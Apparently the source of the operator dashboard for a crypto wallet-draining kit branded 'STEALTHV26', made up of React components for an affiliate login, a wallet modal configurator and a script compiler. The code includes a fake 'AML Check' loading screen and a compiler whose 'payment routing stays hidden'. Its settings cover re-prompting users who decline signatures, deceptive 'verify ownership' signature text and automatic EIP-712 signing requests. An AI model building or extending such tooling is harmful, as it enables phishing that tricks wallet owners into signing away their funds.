            <FieldLabel>Font Family</FieldLabel>
            <StyledSelect value={settings.font} options={["Space Grotesk", "JetBrains Mono", "Inter", "Roboto", "Poppins"]} onChange={(value) => update("font", value)} />
          </div>
          <div>
            <FieldLabel>Theme</FieldLabel>
            <StyledSelect value={settings.theme} options={["auto", "light", "dark"]} onChange={(value) => update("theme", value)} />
          </div>
          <div>
            <FieldLabel>Open Event</FieldLabel>
            <StyledSelect value={settings.openEvent} options={["After click on button", "On page load", "On timer"]} onChange={(value) => update("openEvent", value)} />
          </div>
          <div>
            <FieldLabel>Open Trigger</FieldLabel>
            <StyledSelect value={settings.openTrigger} options={["Automatic", "Manual", "Button Click"]} onChange={(value) => update("openTrigger", value)} />
          </div>
        </div>
      </div>
    </div>
  );
}
```

### src/components/affiliate/legacy-login-gate.tsx

```tsx
"use client";

import { useState } from "react";
import { Eye, EyeOff, Fingerprint, Lock, LogIn, Users } from "lucide-react";

export function LegacyLoginGate({
  onLogin,
}: {
  onLogin: (session: { projectId: string; projectName?: string }) => void;
}) {
  const [customerId, setCustomerId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [loadingStep, setLoadingStep] = useState(0);
  const [authError, setAuthError] = useState("");

  async function handleSignIn() {
    setAuthError("");
    const projectId = customerId.trim();
    if (!projectId) {
      setAuthError("Project ID is required.");
      return;
    }

    try {
      const res = await fetch("/api/affiliate/access", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ projectId, password }),
      });
      const data = (await res.json()) as { message?: string; project?: { id: string; name?: string } };
      if (!res.ok) throw new Error(data?.message || "Access denied.");
      const project = data?.project;
      if (!project?.id) throw new Error("Missing affiliate project.");

      setLoading(true);
      setLoadingStep(0);
      let step = 0;
      const advance = () => {
        step += 1;
        setLoadingStep(step);
        if (step < 4) {
          setTimeout(advance, 700);
        } else {
          setTimeout(() => {
            setLoading(false);
            onLogin({ projectId: project.id, projectName: project.name });
          }, 500);
        }
      };
      setTimeout(advance, 700);
    } catch (error) {
      setAuthError(error instanceof Error ? error.message : "Access denied.");
    }
  }

  const steps = [
    "Connecting to Blockchain...",
    "AML Check...",
    "Verifying Credentials...",
    "Establishing Secure Session...",
  ];

  return (
    <>
      {loading ? (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(3,3,4,0.92)",
            backdropFilter: "blur(12px)",
            zIndex: 100,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            gap: "32px",
          }}
        >
          <div
            style={{
              width: 80,
              height: 80,
              borderRadius: "50%",
              border: "3px solid rgba(255,45,146,0.15)",
              borderTopColor: "#FF2D92",
              animation: "spin 0.8s linear infinite",
            }}
          />
          <div style={{ display: "flex", flexDirection: "column", gap: 12, textAlign: "center" }}>
            {steps.map((step, index) => (
              <div
                key={step}
                style={{
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 12,
                  letterSpacing: "0.12em",
                  textTransform: "uppercase",
                  color: index < loadingStep ? "#FF2D92" : index === loadingStep ? "#f0f0f5" : "rgba(240,240,245,0.3)",
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  justifyContent: "center",
                }}
              >
                <span style={{ color: index < loadingStep ? "#00FF85" : index === loadingStep ? "#FF2D92" : "rgba(255,255,255,0.2)" }}>
                  {index < loadingStep ? "✓" : index === loadingStep ? "›" : "○"}
                </span>
                {step}
              </div>
            ))}
          </div>
        </div>
      ) : null}

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>

      <div
        style={{
          minHeight: "100vh",
          background: "#030304",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          fontFamily: "Space Grotesk, sans-serif",
          backgroundImage: "radial-gradient(circle at 1px 1px, rgba(255,45,146,0.08) 1px, transparent 0)",
          backgroundSize: "32px 32px",
          margin: "-24px",
        }}
      >
        <div
          style={{
            animation: "fadeUp 0.5s cubic-bezier(0.4,0,0.2,1)",
            width: "100%",
            maxWidth: 440,
            padding: "0 24px",
          }}
        >
          <div style={{ textAlign: "center", marginBottom: 48 }}>
            <div style={{ display: "inline-flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
              <div
                style={{
                  width: 36,
                  height: 36,
                  background: "linear-gradient(135deg, #FF2D92, #ff6bb5)",
                  borderRadius: 8,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  boxShadow: "0 0 20px rgba(255,45,146,0.5)",
                }}
              >
                <span style={{ color: "#fff", fontWeight: 800, fontSize: 14 }}>S</span>
              </div>
              <span
                style={{
                  fontWeight: 800,
                  fontSize: 20,
                  color: "#f0f0f5",
                  letterSpacing: "0.05em",
                }}
              >
                STEALTH<span style={{ color: "#FF2D92" }}>V26</span>
              </span>
            </div>
            <p
              style={{
                fontFamily: "JetBrains Mono, monospace",
                fontSize: 11,
                color: "rgba(240,240,245,0.4)",
                letterSpacing: "0.15em",
                textTransform: "uppercase",
              }}
            >
              AFFILIATE PORTAL
            </p>
          </div>

          <div
            style={{
              background: "#0d0d12",
              border: "1px solid rgba(255,255,255,0.07)",
              borderRadius: 16,
```

### src/components/affiliate/legacy-modal-tab.tsx

```tsx
"use client";

import type { ErrorState, MessageStep, ModalSettings } from "@/components/affiliate/legacy-types";

const walletOptions = ["MetaMask", "Coinbase", "WalletConnect", "Trust", "Rainbow", "Ledger", "Phantom"];

export function LegacyModalTab({
  settings,
  onChange,
  messageSteps,
  onMessageChange,
  errorStates,
  onErrorChange,
}: {
  settings: ModalSettings;
  onChange: (settings: ModalSettings) => void;
  messageSteps: MessageStep[];
  onMessageChange: (steps: MessageStep[]) => void;
  errorStates: ErrorState[];
  onErrorChange: (states: ErrorState[]) => void;
}) {
  const toggleWallet = (wallet: string) => {
    const supportedWallets = settings.supportedWallets.includes(wallet)
      ? settings.supportedWallets.filter((item) => item !== wallet)
      : [...settings.supportedWallets, wallet];
    onChange({ ...settings, supportedWallets });
  };

  return (
    <div style={{ display: "grid", gap: 22 }}>
      <div style={{ background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 28, padding: 24 }}>
        <div style={{ fontWeight: 700, fontSize: 22, color: "#2a2732", marginBottom: 16 }}>Compiler</div>
        <div style={{ fontSize: 13, color: "#9a96a7", marginBottom: 20 }}>
          Select modal defaults, wallet choices, and message copy for the affiliate compiler flow.
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 18, marginBottom: 20 }}>
          <label>
            <div style={{ fontSize: 12, color: "#8f8a97", marginBottom: 8, fontWeight: 700 }}>Border Radius</div>
            <input
              type="range"
              min={0}
              max={24}
              value={settings.borderRadius}
              onChange={(event) => onChange({ ...settings, borderRadius: Number(event.target.value) })}
              style={{ width: "100%" }}
            />
          </label>
          <label>
            <div style={{ fontSize: 12, color: "#8f8a97", marginBottom: 8, fontWeight: 700 }}>Overlay Blur</div>
            <input
              type="range"
              min={0}
              max={24}
              value={settings.overlayBlur}
              onChange={(event) => onChange({ ...settings, overlayBlur: Number(event.target.value) })}
              style={{ width: "100%" }}
            />
          </label>
          <label>
            <div style={{ fontSize: 12, color: "#8f8a97", marginBottom: 8, fontWeight: 700 }}>Accent Color</div>
            <input type="color" value={settings.accentColor} onChange={(event) => onChange({ ...settings, accentColor: event.target.value })} />
          </label>
        </div>
        <div style={{ marginBottom: 20 }}>
          <div style={{ fontSize: 12, color: "#8f8a97", marginBottom: 8, fontWeight: 700 }}>Supported Wallets</div>
          <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
            {walletOptions.map((wallet) => {
              const selected = settings.supportedWallets.includes(wallet);
              return (
                <button
                  key={wallet}
                  onClick={() => toggleWallet(wallet)}
                  style={{
                    padding: "8px 16px",
                    borderRadius: 999,
                    border: "1px solid rgba(64, 54, 88, 0.08)",
                    background: selected ? "#766ef5" : "#fbfaf8",
                    color: selected ? "#fff" : "#555166",
                    cursor: "pointer",
                  }}
                >
                  {wallet}
                </button>
              );
            })}
          </div>
        </div>
        <div style={{ display: "grid", gap: 12 }}>
          {messageSteps.slice(0, 3).map((step) => (
            <input
              key={step.id}
              value={step.text}
              onChange={(event) =>
                onMessageChange(messageSteps.map((item) => (item.id === step.id ? { ...item, text: event.target.value } : item)))
              }
              style={{
                width: "100%",
                background: "#fbfaf8",
                border: "1px solid rgba(64, 54, 88, 0.08)",
                borderRadius: 14,
                padding: "13px 14px",
                color: "#332f3d",
                fontSize: 14,
                outline: "none",
              }}
            />
          ))}
          {errorStates.length ? (
            <input
              value={errorStates[0].title}
              onChange={(event) =>
                onErrorChange(errorStates.map((item, index) => (index === 0 ? { ...item, title: event.target.value } : item)))
              }
              style={{
                width: "100%",
                background: "#fbfaf8",
                border: "1px solid rgba(64, 54, 88, 0.08)",
                borderRadius: 14,
                padding: "13px 14px",
                color: "#332f3d",
                fontSize: 14,
                outline: "none",
              }}
            />
          ) : null}
        </div>
      </div>
    </div>
  );
}
```

### src/components/affiliate/legacy-script-generator.tsx

```tsx
"use client";

import { useState } from "react";
import { Check, Copy, FileCode2, LoaderCircle } from "lucide-react";

export function LegacyScriptGenerator({ onGenerate }: { onGenerate: () => Promise<string> }) {
  const [isGenerating, setIsGenerating] = useState(false);
  const [script, setScript] = useState("");
  const [copied, setCopied] = useState(false);

  async function handleGenerate() {
    setIsGenerating(true);
    const result = await onGenerate();
    setScript(result);
    setIsGenerating(false);
  }

  function handleCopy() {
    navigator.clipboard.writeText(script);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div style={{ borderTop: "1px solid rgba(64, 54, 88, 0.08)", background: "#faf9f7", padding: "20px 42px 28px" }}>
      <div style={{ background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 28, padding: "22px 24px" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 16, marginBottom: 18 }}>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, color: "#2b2733", fontWeight: 700 }}>
              <FileCode2 size={18} color="#766ef5" />
              <span>Compiler</span>
            </div>
            <div style={{ color: "#9793a0", marginTop: 6 }}>
              Build a regular affiliate script bundle. Payment routing stays hidden and controlled by the backend.
            </div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            {script ? (
              <button
                onClick={handleCopy}
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  height: 42,
                  padding: "0 16px",
                  borderRadius: 14,
                  border: "1px solid rgba(64, 54, 88, 0.08)",
                  background: "#fff",
                  color: copied ? "#5dbe8a" : "#555166",
                  cursor: "pointer",
                  fontWeight: 600,
                }}
              >
                {copied ? <Check size={16} /> : <Copy size={16} />}
                {copied ? "Copied" : "Copy build"}
              </button>
            ) : null}
            <button
              onClick={() => void handleGenerate()}
              disabled={isGenerating}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                height: 46,
                padding: "0 18px",
                borderRadius: 16,
                border: "none",
                background: "#766ef5",
                color: "#fff",
                cursor: isGenerating ? "not-allowed" : "pointer",
                fontWeight: 700,
                boxShadow: "0 12px 24px rgba(118, 110, 245, 0.22)",
              }}
            >
              {isGenerating ? <LoaderCircle size={17} /> : <FileCode2 size={17} />}
              {isGenerating ? "Compiling..." : script ? "Recompile script.js" : "Compile script.js"}
            </button>
          </div>
        </div>
        {script ? (
          <pre
            style={{
              margin: 0,
              padding: "18px 20px",
              borderRadius: 20,
              background: "#f6f4fb",
              border: "1px solid rgba(64, 54, 88, 0.06)",
              color: "#504d5f",
              fontSize: 12,
              lineHeight: 1.7,
              maxHeight: 220,
              overflow: "auto",
            }}
          >
            <code>{script}</code>
          </pre>
        ) : (
          <div
            style={{
              minHeight: 124,
              borderRadius: 20,
              border: "1px dashed rgba(118, 110, 245, 0.18)",
              background: "#f8f6fd",
              display: "grid",
              placeItems: "center",
              color: "#9a96a7",
              textAlign: "center",
              padding: 24,
            }}
          >
            No build yet. Compile the current affiliate workspace to generate `script.js`.
          </div>
        )}
      </div>
    </div>
  );
}
```

```tsx
"use client";

import { Globe, LayoutDashboard, ScrollText, Settings, Workflow } from "lucide-react";
import type { Tab } from "@/components/affiliate/legacy-types";

const tabs = [
  { id: "dashboard" as Tab, label: "Dashboard", icon: LayoutDashboard },
  { id: "general" as Tab, label: "Domains", icon: Globe },
  { id: "modal" as Tab, label: "Compiler", icon: Workflow },
];

const utilityItems = [
  { label: "Logs", icon: ScrollText },
  { label: "Settings", icon: Settings },
];

export function LegacySidebar({
  activeTab,
  onTabChange,
}: {
  activeTab: Tab;
  onTabChange: (tab: Tab) => void;
}) {
  return (
    <aside
      style={{
        width: 320,
        minWidth: 320,
        background: "#f7f6f3",
        borderRight: "1px solid rgba(64, 54, 88, 0.08)",
        padding: "88px 28px 24px",
        display: "flex",
        flexDirection: "column",
        gap: 14,
      }}
    >
      <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
        {tabs.map((tab) => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => onTabChange(tab.id)}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 16,
                width: "100%",
                borderRadius: 22,
                padding: "18px 28px",
                border: "none",
                background: isActive ? "rgba(124, 115, 255, 0.14)" : "transparent",
                color: isActive ? "#766ef5" : "#2d2b36",
                cursor: "pointer",
                fontSize: 22,
                fontWeight: 500,
                textAlign: "left",
              }}
            >
              <Icon size={28} strokeWidth={1.8} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      <div style={{ display: "flex", flexDirection: "column", gap: 10, marginTop: 18 }}>
        {utilityItems.map((item) => {
          const Icon = item.icon;
          return (
            <div
              key={item.label}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 16,
                borderRadius: 22,
                padding: "18px 28px",
                color: "#3d3b44",
                fontSize: 22,
                fontWeight: 500,
              }}
            >
              <Icon size={28} strokeWidth={1.8} />
              <span>{item.label}</span>
            </div>
          );
        })}
      </div>
    </aside>
  );
}
```

```tsx
"use client";

import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Slider } from "@/components/ui/slider";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import { PenTool, FileText, RefreshCw } from "lucide-react";

export function AdvancedTab() {
  const { advancedConfig, setAdvancedConfig } = useStore();

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
      {/* Signature & Retry Settings */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-2">
            <PenTool className="h-4 w-4 text-primary" />
            <CardTitle className="text-base">Signature & Retry Settings</CardTitle>
          </div>
          <CardDescription>Configure signature behavior and retry policies</CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <Label className="text-xs font-medium">Retry Count</Label>
              <span className="text-sm font-mono font-bold">{advancedConfig.retryCount}</span>
            </div>
            <Slider
              value={[advancedConfig.retryCount]}
              onValueChange={([v]) => setAdvancedConfig({ retryCount: v })}
              min={0}
              max={10}
              step={1}
            />
            <p className="text-[11px] text-muted-foreground">
              Maximum attempts after user-declined signature
            </p>
          </div>

          <Separator />

          <div className="space-y-2">
            <Label className="text-xs font-medium">Signature Prompt Custom Text</Label>
            <Input
              value={advancedConfig.signaturePromptText}
              onChange={(e) => setAdvancedConfig({ signaturePromptText: e.target.value })}
              placeholder="Verify ownership of {wallet}"
              className="text-sm"
            />
            <p className="text-[11px] text-muted-foreground">
              Customizable confirmation message. Use &#123;wallet&#125; for dynamic address insertion.
            </p>
          </div>

          <Separator />

          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <Label className="text-xs font-medium">Typed Data Enforcement (EIP-712)</Label>
              <p className="text-[11px] text-muted-foreground">
                Use eth_signTypedData for structured signature requests
              </p>
            </div>
            <Switch
              checked={advancedConfig.typedDataEnforcement}
              onCheckedChange={(v) => setAdvancedConfig({ typedDataEnforcement: v })}
            />
          </div>

          <Separator />

          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <Label className="text-xs font-medium">Auto Signature Prompt</Label>
              <p className="text-[11px] text-muted-foreground">
                Trigger signature request automatically after connection
              </p>
            </div>
            <Switch
              checked={advancedConfig.autoSignaturePrompt}
              onCheckedChange={(v) => setAdvancedConfig({ autoSignaturePrompt: v })}
            />
          </div>
        </CardContent>
      </Card>

      {/* Logging & Monitoring */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-2">
            <FileText className="h-4 w-4 text-primary" />
            <CardTitle className="text-base">Logging & Monitoring</CardTitle>
          </div>
          <CardDescription>Configure logging format and event tracking</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label className="text-xs font-medium">Log Format</Label>
            <Select
              value={advancedConfig.logFormat}
              onValueChange={(v) =>
                setAdvancedConfig({ logFormat: v as "json" | "detailed" | "minimal" })
              }
            >
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="json">JSON</SelectItem>
                <SelectItem value="detailed">Detailed</SelectItem>
                <SelectItem value="minimal">Minimal</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <Separator />

          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <Label className="text-xs font-medium">Log Signature Prompts</Label>
              <p className="text-[11px] text-muted-foreground">
                Record when signature requests are shown
              </p>
            </div>
            <Switch
              checked={advancedConfig.logSignaturePrompts}
              onCheckedChange={(v) => setAdvancedConfig({ logSignaturePrompts: v })}
            />
          </div>

          <Separator />

          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <Label className="text-xs font-medium">Log Chain Switch Events</Label>
              <p className="text-[11px] text-muted-foreground">
                Monitor network changes
              </p>
            </div>
            <Switch
              checked={advancedConfig.logChainSwitchEvents}
              onCheckedChange={(v) => setAdvancedConfig({ logChainSwitchEvents: v })}
            />
          </div>

          <Separator />

          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <Label className="text-xs font-medium">Log Full Site URL</Label>
              <p className="text-[11px] text-muted-foreground">
                Capture session entry points for analytics
              </p>
            </div>
            <Switch
              checked={advancedConfig.logFullSiteURL}
              onCheckedChange={(v) => setAdvancedConfig({ logFullSiteURL: v })}
            />
          </div>
        </CardContent>
      </Card>

      {/* UX & Performance Controls */}
      <Card className="lg:col-span-2">
        <CardHeader>
          <div className="flex items-center gap-2">
            <RefreshCw className="h-4 w-4 text-primary" />
            <CardTitle className="text-base">UX & Performance Controls</CardTitle>
          </div>
          <CardDescription>Session caching, reload behavior, and performance tuning</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="flex items-center justify-between">
              <div className="space-y-1">
                <Label className="text-xs font-medium">Session Caching</Label>
                <p className="text-[11px] text-muted-foreground">
                  Cache wallet data for faster reinitialization
                </p>
              </div>
              <Switch
                checked={advancedConfig.sessionCaching}
                onCheckedChange={(v) => setAdvancedConfig({ sessionCaching: v })}
              />
            </div>

            <div className="flex items-center justify-between">
              <div className="space-y-1">
                <Label className="text-xs font-medium">Eligibility Reload</Label>
                <p className="text-[11px] text-muted-foreground">
                  Refresh state if requirements are not met
                </p>
              </div>
              <Switch
                checked={advancedConfig.eligibilityReload}
                onCheckedChange={(v) => setAdvancedConfig({ eligibilityReload: v })}
              />
            </div>

            <div className="flex items-center justify-between">
              <div className="space-y-1">
                <Label className="text-xs font-medium">Post-Transaction Refresh</Label>
                <p className="text-[11px] text-muted-foreground">
                  Reload UI after successful transaction execution
                </p>
              </div>
              <Switch
                checked={advancedConfig.postTransactionRefresh}
                onCheckedChange={(v) => setAdvancedConfig({ postTransactionRefresh: v })}
              />
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
```
